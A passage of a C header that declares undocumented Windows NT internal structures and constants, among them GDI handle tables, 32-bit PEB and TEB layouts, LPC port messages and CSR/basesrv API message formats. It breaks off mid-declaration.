#define GDI_MAKE_HANDLE(Index, Unique) ((ULONG)(((ULONG)(Unique) << GDI_HANDLE_INDEX_BITS) | (ULONG)(Index)))

// GDI server-side types

#define GDI_DEF_TYPE 0
#define GDI_DC_TYPE 1
#define GDI_DD_DIRECTDRAW_TYPE 2
#define GDI_DD_SURFACE_TYPE 3
#define GDI_RGN_TYPE 4
#define GDI_SURF_TYPE 5
#define GDI_CLIENTOBJ_TYPE 6
#define GDI_PATH_TYPE 7
#define GDI_PAL_TYPE 8
#define GDI_ICMLCS_TYPE 9
#define GDI_LFONT_TYPE 10
#define GDI_RFONT_TYPE 11
#define GDI_PFE_TYPE 12
#define GDI_PFT_TYPE 13
#define GDI_ICMCXF_TYPE 14
#define GDI_ICMDLL_TYPE 15
#define GDI_BRUSH_TYPE 16
#define GDI_PFF_TYPE 17 // unused
#define GDI_CACHE_TYPE 18 // unused
#define GDI_SPACE_TYPE 19
#define GDI_DBRUSH_TYPE 20 // unused
#define GDI_META_TYPE 21
#define GDI_EFSTATE_TYPE 22
#define GDI_BMFD_TYPE 23 // unused
#define GDI_VTFD_TYPE 24 // unused
#define GDI_TTFD_TYPE 25 // unused
#define GDI_RC_TYPE 26 // unused
#define GDI_TEMP_TYPE 27 // unused
#define GDI_DRVOBJ_TYPE 28
#define GDI_DCIOBJ_TYPE 29 // unused
#define GDI_SPOOL_TYPE 30

// GDI client-side types

#define GDI_CLIENT_TYPE_FROM_HANDLE(Handle) ((ULONG)(Handle) & ((GDI_HANDLE_ALTTYPE_MASK << GDI_HANDLE_ALTTYPE_SHIFT) | \
	(GDI_HANDLE_TYPE_MASK << GDI_HANDLE_TYPE_SHIFT)))
#define GDI_CLIENT_TYPE_FROM_UNIQUE(Unique) GDI_CLIENT_TYPE_FROM_HANDLE((ULONG)(Unique) << 16)

#define GDI_ALTTYPE_1 (1 << GDI_HANDLE_ALTTYPE_SHIFT)
#define GDI_ALTTYPE_2 (2 << GDI_HANDLE_ALTTYPE_SHIFT)
#define GDI_ALTTYPE_3 (3 << GDI_HANDLE_ALTTYPE_SHIFT)

#define GDI_CLIENT_BITMAP_TYPE (GDI_SURF_TYPE << GDI_HANDLE_TYPE_SHIFT)
#define GDI_CLIENT_BRUSH_TYPE (GDI_BRUSH_TYPE << GDI_HANDLE_TYPE_SHIFT)
#define GDI_CLIENT_CLIENTOBJ_TYPE (GDI_CLIENTOBJ_TYPE << GDI_HANDLE_TYPE_SHIFT)
#define GDI_CLIENT_DC_TYPE (GDI_DC_TYPE << GDI_HANDLE_TYPE_SHIFT)
#define GDI_CLIENT_FONT_TYPE (GDI_LFONT_TYPE << GDI_HANDLE_TYPE_SHIFT)
#define GDI_CLIENT_PALETTE_TYPE (GDI_PAL_TYPE << GDI_HANDLE_TYPE_SHIFT)
#define GDI_CLIENT_REGION_TYPE (GDI_RGN_TYPE << GDI_HANDLE_TYPE_SHIFT)

#define GDI_CLIENT_ALTDC_TYPE (GDI_CLIENT_DC_TYPE | GDI_ALTTYPE_1)
#define GDI_CLIENT_DIBSECTION_TYPE (GDI_CLIENT_BITMAP_TYPE | GDI_ALTTYPE_1)
#define GDI_CLIENT_EXTPEN_TYPE (GDI_CLIENT_BRUSH_TYPE | GDI_ALTTYPE_2)
#define GDI_CLIENT_METADC16_TYPE (GDI_CLIENT_CLIENTOBJ_TYPE | GDI_ALTTYPE_3)
#define GDI_CLIENT_METAFILE_TYPE (GDI_CLIENT_CLIENTOBJ_TYPE | GDI_ALTTYPE_2)
#define GDI_CLIENT_METAFILE16_TYPE (GDI_CLIENT_CLIENTOBJ_TYPE | GDI_ALTTYPE_1)
#define GDI_CLIENT_PEN_TYPE (GDI_CLIENT_BRUSH_TYPE | GDI_ALTTYPE_1)

typedef struct _GDI_HANDLE_ENTRY
{
	union
	{
		PVOID Object;
		PVOID NextFree;
	};
	union
	{
		struct
		{
			USHORT ProcessId;
			USHORT Lock : 1;
			USHORT Count : 15;
		};
		ULONG Value;
	} Owner;
	USHORT Unique;
	UCHAR Type;
	UCHAR Flags;
	PVOID UserPointer;
} GDI_HANDLE_ENTRY, *PGDI_HANDLE_ENTRY;

typedef struct _GDI_SHARED_MEMORY
{
	GDI_HANDLE_ENTRY Handles[GDI_MAX_HANDLE_COUNT];
} GDI_SHARED_MEMORY, *PGDI_SHARED_MEMORY;

#define FLS_MAXIMUM_AVAILABLE 128
#define TLS_MINIMUM_AVAILABLE 64
#define TLS_EXPANSION_SLOTS 1024

#define DOS_MAX_COMPONENT_LENGTH 255
#define DOS_MAX_PATH_LENGTH (DOS_MAX_COMPONENT_LENGTH + 5)

typedef struct _CURDIR
{
	UNICODE_STRING DosPath;
	HANDLE Handle;
} CURDIR, *PCURDIR;

#define RTL_USER_PROC_CURDIR_CLOSE 0x00000002
#define RTL_USER_PROC_CURDIR_INHERIT 0x00000003

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	USHORT Flags;
	USHORT Length;
	ULONG TimeStamp;
	STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

#define RTL_MAX_DRIVE_LETTERS 32
#define RTL_DRIVE_LETTER_VALID (USHORT)0x0001

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;

	ULONG Flags;
	ULONG DebugFlags;

	HANDLE ConsoleHandle;
	ULONG ConsoleFlags;
	HANDLE StandardInput;
	HANDLE StandardOutput;
	HANDLE StandardError;

	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PVOID Environment;

	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;

	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

	ULONG EnvironmentSize;
	ULONG EnvironmentVersion;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

#define WOW64_SYSTEM_DIRECTORY "SysWOW64"
#define WOW64_SYSTEM_DIRECTORY_U L"SysWOW64"
#define WOW64_X86_TAG " (x86)"
#define WOW64_X86_TAG_U L" (x86)"

typedef enum _WOW64_SHARED_INFORMATION
{
	SharedNtdll32LdrInitializeThunk = 0,
	SharedNtdll32KiUserExceptionDispatcher = 1,
	SharedNtdll32KiUserApcDispatcher = 2,
	SharedNtdll32KiUserCallbackDispatcher = 3,
	SharedNtdll32LdrHotPatchRoutine = 4,
	SharedNtdll32ExpInterlockedPopEntrySListFault = 5,
	SharedNtdll32ExpInterlockedPopEntrySListResume = 6,
	SharedNtdll32ExpInterlockedPopEntrySListEnd = 7,
	SharedNtdll32RtlUserThreadStart = 8,
	SharedNtdll32pQueryProcessDebugInformationRemote = 9,
	SharedNtdll32EtwpNotificationThread = 10,
	SharedNtdll32BaseAddress = 11,
	Wow64SharedPageEntriesCount = 12
} WOW64_SHARED_INFORMATION;

// 21.12.2011 added
#define SET_LAST_STATUS(S)NtCurrentTeb()->LastErrorValue = RtlNtStatusToDosError(NtCurrentTeb()->LastStatusValue = (ULONG)(S))
// 21.12.2011 - end

// 32-bit definitions

#if (_MSC_VER < 1300) && !defined(_WINDOWS_)
typedef struct LIST_ENTRY32 {
    DWORD Flink;
    DWORD Blink;
} LIST_ENTRY32;
typedef LIST_ENTRY32 *PLIST_ENTRY32;

typedef struct LIST_ENTRY64 {
    ULONGLONG Flink;
    ULONGLONG Blink;
} LIST_ENTRY64;
typedef LIST_ENTRY64 *PLIST_ENTRY64;
#endif

#define WOW64_POINTER(Type) ULONG

typedef struct _PEB_LDR_DATA32
{
	ULONG Length;
	BOOLEAN Initialized;
	WOW64_POINTER(HANDLE) SsHandle;
	LIST_ENTRY32 InLoadOrderModuleList;
	LIST_ENTRY32 InMemoryOrderModuleList;
	LIST_ENTRY32 InInitializationOrderModuleList;
	WOW64_POINTER(PVOID) EntryInProgress;
	BOOLEAN ShutdownInProgress;
	WOW64_POINTER(HANDLE) ShutdownThreadId;
} PEB_LDR_DATA32, *PPEB_LDR_DATA32;

#define LDR_DATA_TABLE_ENTRY_SIZE_WINXP32 FIELD_OFFSET( LDR_DATA_TABLE_ENTRY32, ForwarderLinks )

typedef struct _LDR_DATA_TABLE_ENTRY32
{
	LIST_ENTRY32 InLoadOrderLinks;
	LIST_ENTRY32 InMemoryOrderLinks;
	LIST_ENTRY32 InInitializationOrderLinks;
	WOW64_POINTER(PVOID) DllBase;
	WOW64_POINTER(PVOID) EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING32 FullDllName;
	UNICODE_STRING32 BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union
	{
		LIST_ENTRY32 HashLinks;
		struct
		{
			WOW64_POINTER(PVOID) SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		WOW64_POINTER(PVOID) LoadedImports;
	};
	WOW64_POINTER(PVOID) EntryPointActivationContext;
	WOW64_POINTER(PVOID) PatchInformation;
	LIST_ENTRY32 ForwarderLinks;
	LIST_ENTRY32 ServiceTagLinks;
	LIST_ENTRY32 StaticLinks;
	WOW64_POINTER(PVOID) ContextInformation;
	WOW64_POINTER(ULONG_PTR) OriginalBase;
	LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32;

typedef struct _CURDIR32
{
	UNICODE_STRING32 DosPath;
	WOW64_POINTER(HANDLE) Handle;
} CURDIR32, *PCURDIR32;

typedef struct _RTL_DRIVE_LETTER_CURDIR32
{
	USHORT Flags;
	USHORT Length;
	ULONG TimeStamp;
	STRING32 DosPath;
} RTL_DRIVE_LETTER_CURDIR32, *PRTL_DRIVE_LETTER_CURDIR32;

typedef struct _RTL_USER_PROCESS_PARAMETERS32
{
	ULONG MaximumLength;
	ULONG Length;

	ULONG Flags;
	ULONG DebugFlags;

	WOW64_POINTER(HANDLE) ConsoleHandle;
	ULONG ConsoleFlags;
	WOW64_POINTER(HANDLE) StandardInput;
	WOW64_POINTER(HANDLE) StandardOutput;
	WOW64_POINTER(HANDLE) StandardError;

	CURDIR32 CurrentDirectory;
	UNICODE_STRING32 DllPath;
	UNICODE_STRING32 ImagePathName;
	UNICODE_STRING32 CommandLine;
	WOW64_POINTER(PVOID) Environment;

	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;

	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING32 WindowTitle;
	UNICODE_STRING32 DesktopInfo;
	UNICODE_STRING32 ShellInfo;
	UNICODE_STRING32 RuntimeData;
	RTL_DRIVE_LETTER_CURDIR32 CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

	ULONG EnvironmentSize;
	ULONG EnvironmentVersion;
} RTL_USER_PROCESS_PARAMETERS32, *PRTL_USER_PROCESS_PARAMETERS32;

typedef struct _PEB32
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	WOW64_POINTER(HANDLE) Mutant;

	WOW64_POINTER(PVOID) ImageBaseAddress;
	WOW64_POINTER(PPEB_LDR_DATA) Ldr;
	WOW64_POINTER(PRTL_USER_PROCESS_PARAMETERS) ProcessParameters;
	WOW64_POINTER(PVOID) SubSystemData;
	WOW64_POINTER(PVOID) ProcessHeap;
	WOW64_POINTER(PRTL_CRITICAL_SECTION) FastPebLock;
	WOW64_POINTER(PVOID) AtlThunkSListPtr;
	WOW64_POINTER(PVOID) IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ReservedBits0 : 27;
		};
		ULONG EnvironmentUpdateCount;
	};
	union
	{
		WOW64_POINTER(PVOID) KernelCallbackTable;
		WOW64_POINTER(PVOID) UserSharedInfoPtr;
	};
	ULONG SystemReserved[1];
	ULONG AtlThunkSListPtr32;
	WOW64_POINTER(PVOID) ApiSetMap;
	ULONG TlsExpansionCounter;
	WOW64_POINTER(PVOID) TlsBitmap;
	ULONG TlsBitmapBits[2];
	WOW64_POINTER(PVOID) ReadOnlySharedMemoryBase;
	WOW64_POINTER(PVOID) HotpatchInformation;
	WOW64_POINTER(PPVOID) ReadOnlyStaticServerData;
	WOW64_POINTER(PVOID) AnsiCodePageData;
	WOW64_POINTER(PVOID) OemCodePageData;
	WOW64_POINTER(PVOID) UnicodeCaseTableData;

	ULONG NumberOfProcessors;
	ULONG NtGlobalFlag;

	LARGE_INTEGER CriticalSectionTimeout;
	WOW64_POINTER(SIZE_T) HeapSegmentReserve;
	WOW64_POINTER(SIZE_T) HeapSegmentCommit;
	WOW64_POINTER(SIZE_T) HeapDeCommitTotalFreeThreshold;
	WOW64_POINTER(SIZE_T) HeapDeCommitFreeBlockThreshold;

	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
	WOW64_POINTER(PPVOID) ProcessHeaps;

	WOW64_POINTER(PVOID) GdiSharedHandleTable;
	WOW64_POINTER(PVOID) ProcessStarterHelper;
	ULONG GdiDCAttributeList;

	WOW64_POINTER(PRTL_CRITICAL_SECTION) LoaderLock;

	ULONG OSMajorVersion;
	ULONG OSMinorVersion;
	USHORT OSBuildNumber;
	USHORT OSCSDVersion;
	ULONG OSPlatformId;
	ULONG ImageSubsystem;
	ULONG ImageSubsystemMajorVersion;
	ULONG ImageSubsystemMinorVersion;
	WOW64_POINTER(ULONG_PTR) ImageProcessAffinityMask;
	GDI_HANDLE_BUFFER32 GdiHandleBuffer;
	WOW64_POINTER(PVOID) PostProcessInitRoutine;

	WOW64_POINTER(PVOID) TlsExpansionBitmap;
	ULONG TlsExpansionBitmapBits[32];

	ULONG SessionId;

	// Rest of structure not included.
} PEB32, *PPEB32;

#define GDI_BATCH_BUFFER_SIZE 310

typedef struct _GDI_TEB_BATCH32
{
	ULONG Offset;
	WOW64_POINTER(ULONG_PTR) HDC;
	ULONG Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH32, *PGDI_TEB_BATCH32;

#if (_MSC_VER < 1300) && !defined(_WINDOWS_)
//
// 32 and 64 bit specific version for wow64 and the debugger
//
typedef struct _NT_TIB32 {
    DWORD ExceptionList;
    DWORD StackBase;
    DWORD StackLimit;
    DWORD SubSystemTib;
    union {
        DWORD FiberData;
        DWORD Version;
    };
    DWORD ArbitraryUserPointer;
    DWORD Self;
} NT_TIB32, *PNT_TIB32;

typedef struct _NT_TIB64 {
    DWORD64 ExceptionList;
    DWORD64 StackBase;
    DWORD64 StackLimit;
    DWORD64 SubSystemTib;
    union {
        DWORD64 FiberData;
        DWORD Version;
    };
    DWORD64 ArbitraryUserPointer;
    DWORD64 Self;
} NT_TIB64, *PNT_TIB64;
#endif

typedef struct _TEB32
{
	NT_TIB32 NtTib;

	WOW64_POINTER(PVOID) EnvironmentPointer;
	CLIENT_ID32 ClientId;
	WOW64_POINTER(PVOID) ActiveRpcHandle;
	WOW64_POINTER(PVOID) ThreadLocalStoragePointer;
	WOW64_POINTER(PPEB) ProcessEnvironmentBlock;

	ULONG LastErrorValue;
	ULONG CountOfOwnedCriticalSections;
	WOW64_POINTER(PVOID) CsrClientThread;
	WOW64_POINTER(PVOID) Win32ThreadInfo;
	ULONG User32Reserved[26];
	ULONG UserReserved[5];
	WOW64_POINTER(PVOID) WOW32Reserved;
	LCID CurrentLocale;
	ULONG FpSoftwareStatusRegister;
	WOW64_POINTER(PVOID) SystemReserved1[54];
	NTSTATUS ExceptionCode;
	WOW64_POINTER(PVOID) ActivationContextStackPointer;
	BYTE SpareBytes[36];
	ULONG TxFsContext;

	GDI_TEB_BATCH32 GdiTebBatch;
	CLIENT_ID32 RealClientId;
	WOW64_POINTER(HANDLE) GdiCachedProcessHandle;
	ULONG GdiClientPID;
	ULONG GdiClientTID;
	WOW64_POINTER(PVOID) GdiThreadLocalInfo;
	WOW64_POINTER(ULONG_PTR) Win32ClientInfo[62];
	WOW64_POINTER(PVOID) glDispatchTable[233];
	WOW64_POINTER(ULONG_PTR) glReserved1[29];
	WOW64_POINTER(PVOID) glReserved2;
	WOW64_POINTER(PVOID) glSectionInfo;
	WOW64_POINTER(PVOID) glSection;
	WOW64_POINTER(PVOID) glTable;
	WOW64_POINTER(PVOID) glCurrentRC;
	WOW64_POINTER(PVOID) glContext;

	NTSTATUS LastStatusValue;
	UNICODE_STRING32 StaticUnicodeString;
	WCHAR StaticUnicodeBuffer[261];

	WOW64_POINTER(PVOID) DeallocationStack;
	WOW64_POINTER(PVOID) TlsSlots[64];
	LIST_ENTRY32 TlsLinks;
} TEB32, *PTEB32;

typedef
	VOID
	(*PPS_POST_PROCESS_INIT_ROUTINE) (
	VOID
	);

typedef struct _TIB
{
	struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList;
	PVOID StackBase;
	PVOID StackLimit;
	PVOID SubSystemTib;

	union
	{
		PVOID FiberData;
		ULONG Version;
	};

	PVOID ArbitraryUserPointer;
	struct _TIB *Self;
} TIB;
typedef TIB *PTIB;

//
// inifile mapping
//

typedef struct _NLS_USER_INFO
{

	/*<thisrel this+0x0>*/ /*|0xa0|*/ WCHAR iCountry[80];
	/*<thisrel this+0xa0>*/ /*|0xa0|*/ WCHAR sCountry[80];
	/*<thisrel this+0x140>*/ /*|0xa0|*/ WCHAR sList[80];
	/*<thisrel this+0x1e0>*/ /*|0xa0|*/ WCHAR iMeasure[80];
	/*<thisrel this+0x280>*/ /*|0xa0|*/ WCHAR iPaperSize[80];
	/*<thisrel this+0x320>*/ /*|0xa0|*/ WCHAR sDecimal[80];
	/*<thisrel this+0x3c0>*/ /*|0xa0|*/ WCHAR sThousand[80];
	/*<thisrel this+0x460>*/ /*|0xa0|*/ WCHAR sGrouping[80];
	/*<thisrel this+0x500>*/ /*|0xa0|*/ WCHAR iDigits[80];
	/*<thisrel this+0x5a0>*/ /*|0xa0|*/ WCHAR iLZero[80];
	/*<thisrel this+0x640>*/ /*|0xa0|*/ WCHAR iNegNumber[80];
	/*<thisrel this+0x6e0>*/ /*|0xa0|*/ WCHAR sNativeDigits[80];
	/*<thisrel this+0x780>*/ /*|0xa0|*/ WCHAR iDigitSubstitution[80];
	/*<thisrel this+0x820>*/ /*|0xa0|*/ WCHAR sCurrency[80];
	/*<thisrel this+0x8c0>*/ /*|0xa0|*/ WCHAR sMonDecSep[80];
	/*<thisrel this+0x960>*/ /*|0xa0|*/ WCHAR sMonThouSep[80];
	/*<thisrel this+0xa00>*/ /*|0xa0|*/ WCHAR sMonGrouping[80];
	/*<thisrel this+0xaa0>*/ /*|0xa0|*/ WCHAR iCurrDigits[80];
	/*<thisrel this+0xb40>*/ /*|0xa0|*/ WCHAR iCurrency[80];
	/*<thisrel this+0xbe0>*/ /*|0xa0|*/ WCHAR iNegCurr[80];
	/*<thisrel this+0xc80>*/ /*|0xa0|*/ WCHAR sPosSign[80];
	/*<thisrel this+0xd20>*/ /*|0xa0|*/ WCHAR sNegSign[80];
	/*<thisrel this+0xdc0>*/ /*|0xa0|*/ WCHAR sTimeFormat[80];
	/*<thisrel this+0xe60>*/ /*|0xa0|*/ WCHAR s1159[80];
	/*<thisrel this+0xf00>*/ /*|0xa0|*/ WCHAR s2359[80];
	/*<thisrel this+0xfa0>*/ /*|0xa0|*/ WCHAR sShortDate[80];
	/*<thisrel this+0x1040>*/ /*|0xa0|*/ WCHAR sYearMonth[80];
	/*<thisrel this+0x10e0>*/ /*|0xa0|*/ WCHAR sLongDate[80];
	/*<thisrel this+0x1180>*/ /*|0xa0|*/ WCHAR iCalType[80];
	/*<thisrel this+0x1220>*/ /*|0xa0|*/ WCHAR iFirstDay[80];
	/*<thisrel this+0x12c0>*/ /*|0xa0|*/ WCHAR iFirstWeek[80];
	/*<thisrel this+0x1360>*/ /*|0xa0|*/ WCHAR sLocale[80];
	/*<thisrel this+0x1400>*/ /*|0xaa|*/ WCHAR sLocaleName[85];
	/*<thisrel this+0x14ac>*/ /*|0x4|*/ ULONG UserLocaleId;
	/*<thisrel this+0x14b0>*/ /*|0x8|*/ struct _LUID InteractiveUserLuid;
	/*<thisrel this+0x14b8>*/ /*|0x44|*/ UCHAR InteractiveUserSid[68];
	/*<thisrel this+0x14fc>*/ /*|0x4|*/ ULONG ulCacheUpdateCount;
} NLS_USER_INFO, *PNLS_USER_INFO;	// <size 0x1500>

typedef struct _INIFILE_MAPPING_TARGET
{
	struct _INIFILE_MAPPING_TARGET* Next;
	struct _UNICODE_STRING RegistryPath;
} INIFILE_MAPPING_TARGET, *PINIFILE_MAPPING_TARGET;

typedef struct _INIFILE_MAPPING_VARNAME
{
	struct _INIFILE_MAPPING_VARNAME* Next;
	UNICODE_STRING Name;
	ULONG MappingFlags;
	struct _INIFILE_MAPPING_TARGET* MappingTarget;
} INIFILE_MAPPING_VARNAME, *PINIFILE_MAPPING_VARNAME;

typedef struct _INIFILE_MAPPING_APPNAME
{
	struct _INIFILE_MAPPING_APPNAME* Next;
	UNICODE_STRING Name;
	struct _INIFILE_MAPPING_VARNAME* VariableNames;
	struct _INIFILE_MAPPING_VARNAME* DefaultVarNameMapping;
} INIFILE_MAPPING_APPNAME, *PINIFILE_MAPPING_APPNAME;

typedef struct _INIFILE_MAPPING_FILENAME
{
	struct _INIFILE_MAPPING_FILENAME* Next;
	UNICODE_STRING Name;
	struct _INIFILE_MAPPING_APPNAME* ApplicationNames;
	struct _INIFILE_MAPPING_APPNAME* DefaultAppNameMapping;
} INIFILE_MAPPING_FILENAME, *PINIFILE_MAPPING_FILENAME;

typedef struct _INIFILE_MAPPING
{
	struct _INIFILE_MAPPING_FILENAME* FileNames;
	struct _INIFILE_MAPPING_FILENAME* DefaultFileNameMapping;
	struct _INIFILE_MAPPING_FILENAME* WinIniFileMapping;
	ULONG Reserved;
} INIFILE_MAPPING, *PINIFILE_MAPPING;

#define PORT_CONNECT (0x0001)

#define PORT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x1)

typedef struct _PORT_MESSAGE
{
	union {
		struct
		{
			CSHORT DataLength;
			CSHORT TotalLength;
		} s1;

		ULONG Length;

	} u1;

	union
	{
		struct
		{
			CSHORT Type;
			CSHORT DataInfoOffset;
		} s2;
		ULONG ZeroInit;
	} u2;

	union
	{
		LPC_CLIENT_ID ClientId;
		double DoNotUseThisField;       // Force quadword alignment
	};

	ULONG MessageId;
	union
	{
		LPC_SIZE_T ClientViewSize;          // Only valid on LPC_CONNECTION_REQUEST message
		ULONG CallbackId;                   // Only valid on LPC_REQUEST message
	};
	//  UCHAR Data[];
} PORT_MESSAGE, *PPORT_MESSAGE;

typedef struct _PORT_DATA_ENTRY {
	LPC_PVOID Base;
	ULONG Size;
} PORT_DATA_ENTRY, *PPORT_DATA_ENTRY;

typedef struct _PORT_DATA_INFORMATION {
	ULONG CountDataEntries;
	PORT_DATA_ENTRY DataEntries[1];
} PORT_DATA_INFORMATION, *PPORT_DATA_INFORMATION;

	//
	// csrss & csrsrv related
	//

	typedef ULONG CSR_API_NUMBER;

#define CSR_API_PORT_NAME L"ApiPort"

	//
	// This structure is filled in by the client prior to connecting to the CSR
	// server.  The CSR server will fill in the OUT fields if prior to accepting
	// the connection.
	//

	typedef struct _CSR_API_CONNECTINFO {
		HANDLE ObjectDirectory;
		PVOID SharedSectionBase;
		PVOID SharedStaticServerData;
		PVOID SharedSectionHeap;
		ULONG DebugFlags;
		ULONG SizeOfPebData;
		ULONG SizeOfTebData;
		ULONG NumberOfServerDllNames;
		HANDLE ServerProcessId;
	} CSR_API_CONNECTINFO, *PCSR_API_CONNECTINFO;

	//
	// Message format for messages sent from the client to the server
	//

	typedef struct _CSR_CLIENTCONNECT_MSG
	{
		ULONG ServerDllIndex;
		PVOID ConnectionInformation;
		ULONG ConnectionInformationLength;
	} CSR_CLIENTCONNECT_MSG, *PCSR_CLIENTCONNECT_MSG;	// <size 0xc>

#define CSR_NORMAL_PRIORITY_CLASS   0x00000010
#define CSR_IDLE_PRIORITY_CLASS     0x00000020
#define CSR_HIGH_PRIORITY_CLASS     0x00000040
#define CSR_REALTIME_PRIORITY_CLASS 0x00000080

	typedef struct _CSR_CAPTURE_HEADER {
		ULONG Length;
		PVOID RelatedCaptureBuffer;
		ULONG CountMessagePointers;
		PCHAR FreeSpace;
		ULONG_PTR MessagePointerOffsets[1]; // Offsets within CSR_API_MSG of pointers
	} CSR_CAPTURE_HEADER, *PCSR_CAPTURE_HEADER;

#define WINSS_OBJECT_DIRECTORY_NAME     L"\\Windows"

#define CSRSRV_SERVERDLL_INDEX          0
#define CSRSRV_FIRST_API_NUMBER         0

#define BASESRV_SERVERDLL_INDEX         1
#define BASESRV_FIRST_API_NUMBER        0

#define CONSRV_SERVERDLL_INDEX          2
#define CONSRV_FIRST_API_NUMBER         512

#define USERSRV_SERVERDLL_INDEX         3
#define USERSRV_FIRST_API_NUMBER        1024

#define CSR_MAKE_API_NUMBER( DllIndex, ApiIndex ) \
	(CSR_API_NUMBER)(((DllIndex) << 16) | (ApiIndex))

#define CSR_APINUMBER_TO_SERVERDLLINDEX( ApiNumber ) \
	((ULONG)((ULONG)(ApiNumber) >> 16))

#define CSR_APINUMBER_TO_APITABLEINDEX( ApiNumber ) \
	((ULONG)((USHORT)(ApiNumber)))
	
typedef struct _CSR_NT_SESSION
{
	struct _LIST_ENTRY SessionLink;
	ULONG SessionId;
	ULONG ReferenceCount;
	STRING RootDirectory;
} CSR_NT_SESSION, *PCSR_NT_SESSION;

typedef struct _CSR_API_MSG
{
	PORT_MESSAGE h;
	union
	{
		CSR_API_CONNECTINFO ConnectionRequest;
		struct
		{
			PCSR_CAPTURE_HEADER CaptureBuffer;
			CSR_API_NUMBER ApiNumber;
			ULONG ReturnValue;
			ULONG Reserved;
			union
			{
				CSR_CLIENTCONNECT_MSG ClientConnect;
				ULONG_PTR ApiMessageData[ 46 ];
			} u;
		};
	};
} CSR_API_MSG, *PCSR_API_MSG;

typedef
ULONG (*PCSR_CALLBACK_ROUTINE)(
	IN OUT PCSR_API_MSG ReplyMsg
	);

typedef struct _CSR_CALLBACK_INFO
{
	ULONG ApiNumberBase;
	ULONG MaxApiNumber;
	PCSR_CALLBACK_ROUTINE *CallbackDispatchTable;
} CSR_CALLBACK_INFO, *PCSR_CALLBACK_INFO;

// end csrss


//
// Time Zone
//

typedef struct _RTL_DYNAMIC_TIME_ZONE_INFORMATION {
	struct _RTL_TIME_ZONE_INFORMATION tzi;
	WCHAR TimeZoneKeyName[ 128 ];
	UCHAR DynamicDaylightTimeDisabled;
} RTL_DYNAMIC_TIME_ZONE_INFORMATION, *PRTL_DYNAMIC_TIME_ZONE_INFORMATION;	// <size 0x1b0>

//
// basesrv api
//

typedef struct _BASESRV_API_CONNECTINFO
{
	ULONG ExpectedVersion;
	HANDLE DefaultObjectDirectory;
	ULONG WindowsVersion;
	ULONG CurrentVersion;
	ULONG DebugFlags;
	WCHAR WindowsDirectory[ MAX_PATH ];
	WCHAR WindowsSystemDirectory[ MAX_PATH ];
} BASESRV_API_CONNECTINFO, *PBASESRV_API_CONNECTINFO;

typedef enum _BASESRV_API_NUMBER {
	BasepCreateProcess = BASESRV_FIRST_API_NUMBER,
	BasepCreateThread,
	BasepGetTempFile,
	BasepExitProcess,
	BasepDebugProcess,
	BasepCheckVDM,
	BasepUpdateVDMEntry,
	BasepGetNextVDMCommand,
	BasepExitVDM,
	BasepIsFirstVDM,
	BasepGetVDMExitCode,
	BasepSetReenterCount,
	BasepSetProcessShutdownParam,
	BasepGetProcessShutdownParam,
	BasepSetVDMCurDirs,
	BasepGetVDMCurDirs,
	BasepBatNotification,
	BasepRegisterWowExec,
	BasepSoundSentryNotification,
	BasepRefreshIniFileMapping,
	BasepDefineDosDevice,
	BasepSetTermsrvAppInstallMode,
	BasepSetTermsrvClientTimeZone,
	BasepSxsCreateActivationContext,
	BasepDebugProcessStop,
	BasepRegisterThread,
	BasepDeferredCreateProcess,
	BasepNlsGetUserInfo,
	BasepNlsSetUserInfo,
	BasepNlsUpdateCacheCount,
	BasepMaxApiNumber
} BASESRV_API_NUMBER, *PBASESRV_API_NUMBER;

typedef struct _BASE_NLS_SET_USER_INFO_MSG
{
	ULONG LCType;
	USHORT* pData;
	ULONG DataLength;
} BASE_NLS_SET_USER_INFO_MSG, *PBASE_NLS_SET_USER_INFO_MSG;

typedef struct _BASE_NLS_GET_USER_INFO_MSG
{
	struct _NLS_USER_INFO* pData;
	ULONG DataLength;
} BASE_NLS_GET_USER_INFO_MSG, *PBASE_NLS_GET_USER_INFO_MSG;

typedef struct _BASE_NLS_UPDATE_CACHE_COUNT_MSG
{
	ULONG Reserved;
} BASE_NLS_UPDATE_CACHE_COUNT_MSG, *PBASE_NLS_UPDATE_CACHE_COUNT_MSG;

typedef struct _BASE_UPDATE_VDM_ENTRY_MSG
